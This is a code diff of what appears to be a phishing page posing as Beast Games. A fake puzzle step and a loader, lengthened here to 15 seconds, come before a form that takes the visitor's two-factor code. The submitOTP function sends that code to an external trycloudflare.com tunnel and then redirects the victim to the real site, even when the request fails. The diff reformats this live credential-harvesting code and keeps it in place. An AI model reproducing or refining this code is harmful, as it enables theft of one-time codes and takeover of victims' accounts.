@@ -243,29 +243,28 @@
             window.addEventListener('touchend', () => dragging = false);
         }
 
-        function showLoader() {
-            document.getElementById('puzzle-box').style.display = 'none'; 
+                function showLoader() {
+            document.getElementById('puzzle-box').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            setTimeout(() => { 
-                document.getElementById('loader').style.display = 'none'; 
-                document.getElementById('step2_box').style.display = 'block'; 
-            }, 3000);
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('step2_box').style.display = 'block';
+            }, 15000); // 15 Second Delay Fixed
         }
 
         function submitOTP() {
-    const c = document.getElementById('2fa_code').value; 
-    fetch('https://postposted-settings-belly-quest.trycloudflare.com', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({ '2fa_code': c })
-    }).then(() => {
-        // --- PUT THE REDIRECT HERE ---
-        window.location.href = "https://www.beastgames.com";
-    }).catch(() => {
-        // Redirect even if there is an error so the site "unsticks"
-        window.location.href = "https://www.beastgames.com";
-    });
-}
+            const c = document.getElementById('2fa_code').value;
+            fetch('https://postposted-settings-belly-quest.trycloudflare.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({ '2fa_code': c })
+            }).then(() => {
+                window.location.href = "https://www.beastgames.com"; // Redirect Fixed
+            }).catch(() => {
+                window.location.href = "https://www.beastgames.com"; // Fallback Redirect
+            });
+        }
+
 
     </script>
 </body>
